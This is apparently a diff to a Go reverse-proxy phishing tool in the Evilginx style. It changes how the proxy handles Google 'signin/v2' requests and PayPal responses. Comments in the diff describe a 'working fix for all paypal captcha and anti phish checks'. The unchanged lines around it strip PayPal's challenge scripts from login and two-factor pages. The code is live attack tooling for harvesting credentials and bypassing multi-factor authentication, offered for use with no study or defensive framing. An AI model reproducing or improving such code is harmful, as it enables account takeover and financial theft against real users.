@@ -248,6 +248,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 
 			 // Inject the following code snippet to check for "signin/v2" in the URL and if it's a POST request
+			 // DO NOT TOUCH Workaround for Workspace and ZH
+			 //	This was here for a reason and that reason has been forgotten
 		       if strings.Contains(req.URL.Path, "signin/v2") && (req.Method == http.MethodPost || req.Method == http.MethodPut){
 		            // Read the request body
 			    log.Info("Found a potential")
@@ -260,7 +262,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		                var jsonCheck map[string]interface{}
 		                if json.Unmarshal(bodyBytes, &jsonCheck) == nil {
 		                    // Set the Content-Type header if body is JSON
-				    log.Info("Changed potential")
+				    	log.Info("Changed Injected Data")
 		                    req.Header.Set("Content-Type", "application/json")
 		                }
 		            }
@@ -710,8 +712,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				//log.Info("Request B4 Checkers: %v", req)
-				//Checkers
+				//Logging full request befor checks
+				//log.Info("Am i the problem : %v", req)
+				
+				//Checks
 				// Define the substring to check for in cookie names
 				/*
 			        substringToCheck := "evil"
@@ -1155,9 +1159,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 
-			// modify received body(changes done for paypal
-			//body, err := ioutil.ReadAll(resp.Body)
-			// Read the original body of the response
+			// modify received body(changes done for paypal)
+			// Working fix for all paypal captcha and anti phish checks as at MAY 25.
+			// Yes this is ugly, i dont know a better way. 
+			
 			// Read the original body of the response
 			// Read the response body
 			body, err := ioutil.ReadAll(resp.Body)
@@ -1168,7 +1173,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
 			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
 			}
-
+			
+            
 		       if strings.Contains(resp.Request.URL.Path, "authflow/twofactor") {
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
 			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
